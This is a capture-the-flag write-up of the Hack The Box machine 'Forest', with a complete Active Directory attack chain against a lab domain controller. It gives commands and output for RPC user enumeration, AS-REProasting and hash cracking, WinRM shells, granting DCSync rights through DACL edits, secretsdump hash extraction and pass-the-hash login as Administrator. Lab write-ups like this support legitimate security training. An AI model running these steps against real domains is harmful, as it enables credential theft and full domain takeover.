---
title: "Hack The Box: Forest"
date: 2025-11-19
summary: "An Easy Windows-based machine where the target is compromised by enumerating domain users via unauthenticated RPC and performing an AS-REProasting attack against a service account. After cracking the hash for WinRM access, account operator group privileges are leveraged to modify domain object DACLs, granting DCSync rights to dump all Active Directory hashes and obtain Administrator control."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Forest"
tags:
  - ace-genericall
  - ace-writedacl
  - active-directory
  - asreproasting
  - bloodhound
  - bloodhound-ce-python
  - bloodyad
  - dcsync
  - evil-winrm
  - impacket-dacledit
  - impacket-getnpusers
  - impacket-secretsdump
  - john
  - nmap
  - null-guest-authentication
  - rpcclient
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.2.196
Nmap scan report for 10.129.2.196
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2025-11-19 22:09:31 +04 for 39s
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-19 14:16:32Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-11-19T06:16:45-08:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-19T14:16:46
|_  start_date: 2025-11-19T13:39:35
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 13866/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29596/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 7971/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45487/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1h13m08s, deviation: 4h37m08s, median: -3h53m09s
<SNIP>
```

As expected, the target is a Domain Controller given the running services.

### Enumerating SMB

Let’s check if null authentication is allowed in SMB:

```bash
$ netexec smb 10.129.2.196 -u '' -p ''
SMB         10.129.2.196    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.2.196    445    FOREST           [+] htb.local\:
```

It is.

Let’s create a hosts file for `/etc/hosts`:

```bash
$ netexec smb 10.129.2.196 -u '' -p '' --generate-hosts-file hosts
SMB         10.129.2.196    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.2.196    445    FOREST           [+] htb.local\:

$ cat hosts | sudo tee -a /etc/hosts
10.129.2.196     FOREST.htb.local htb.local FOREST
```

Let’s now enumerate SMB shares:

```bash
$ netexec smb htb.local -u '' -p '' --shares
SMB         10.129.2.196    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.2.196    445    FOREST           [+] htb.local\:
SMB         10.129.2.196    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Not allowed.

### Enumerating RPC

Let’s check if null RPC authentication is allowed:

```bash
$ rpcclient -U "" -N forest.htb.local
rpcclient $>
```

It is. Let’s use it to enumerate domain users:

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Nice. Let’s save them into a file:

```bash
$ cat usernames.txt
Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

### AS-REProasting and Exploiting Svc-alfresco

Let’s attempt AS-REProasting against the identified usernames, in hope that any of them has “Do not require Kerberos preauthentication” enabled, using `impacket-GetNPUsers`:

```bash
$ impacket-GetNPUsers htb.local/ -usersfile usernames.txt -outputfile asreproasting.hashes -dc-ip 10.129.2.196

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:54dfae<REDACTED>
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Success! The user Svc-alfresco is vulnerable to AS-REProasting.

Let’s attempt cracking that user’s hash with `john`:

```bash
$ john asreproasting.hashes -w=/usr/share/wordlists/rockyou.txt
<SNIP>
s3r<REDACTED>          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
<SNIP>
```

Nice, it has been successfully cracked.

### RCE as Svc-alfresco

Let’s check if the user can WinRM:

```bash
$ netexec winrm htb.local -u svc-alfresco -p s3r<REDACTED>
WINRM       10.129.2.196    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.2.196    5985   FOREST           [+] htb.local\svc-alfresco:s3r<REDACTED> (Pwn3d!)
```

Great. Now let’s use `evil-winrm` to gain RCE and read the `user.txt` flag:

```bash
$ evil-winrm -i htb.local -u svc-alfresco -p s3r<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls

    Directory: C:\Users\svc-alfresco\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/19/2025   5:46 AM             34 user.txt

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
3f76e8<REDACTED>
```

### Mapping Permissions with Bloodhound

Let’s map the domain in `bloodhound`.

First, let’s collect data for it using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d htb.local -u svc-alfresco -p 's3r<REDACTED>' -ns 10.129.2.196 -c all --zip
<SNIP>
INFO: Compressing output into 20251119195814_bloodhound.zip
```

After inputting the data into `bloodhound`, marking Svc-alfresco as owned, and checking the shortest paths from owned users, the following interesting path can be noticed:

![Figure 1](/assets/images/writeups/hack-the-box-forest/hack-the-box-forest-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Svc-Alfresco is (recursively) part of the Account Operators group, which has GenericAll permission over Exchange Windows Permissions group, which has WriteDacl permission over the domain.

So the attack chain would be as follows:

1. Add Svc-alfresco to the Exchange Windows Permissions group.
2. Grant DCSync permission to Svc-alfresco.
3. Perform a DCSync attack and dump all users’ hashes.

Let’s do that.

### DCSync

1. First, let’s add Svc-alfresco to the Exchange Windows Permission group using `bloodyAD`:

```bash
$ bloodyAD -u svc-alfresco -p s3r<REDACTED> -d htb.local --host 10.129.2.196 add groupMember "exchange windows permissions" svc-alfresco
[+] svc-alfresco added to exchange windows permissions
```

1. Next, let’s grant DCSync permission to Svc-alfresco using `impacket-dacledit`:

```bash
$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3r<REDACTED>'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20251119-191006.bak
[*] DACL modified successfully!
```

1. Now let’s perform a DCSync attack using `impacket-secretsdump`:

```bash
$ impacket-secretsdump htb.local/svc-alfresco:s3r<REDACTED>@FOREST.htb.local -just-dc

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b<REDACTED>:::
<SNIP>
```

Perfect.

### RCE as Administrator

Now let’s use `evil-winrm` to gain RCE as Administrator and grab the `root.txt` flag:

```bash
$ evil-winrm -i htb.local -u Administrator -H 32693b<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/19/2025   5:46 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
227c74<REDACTED>
```
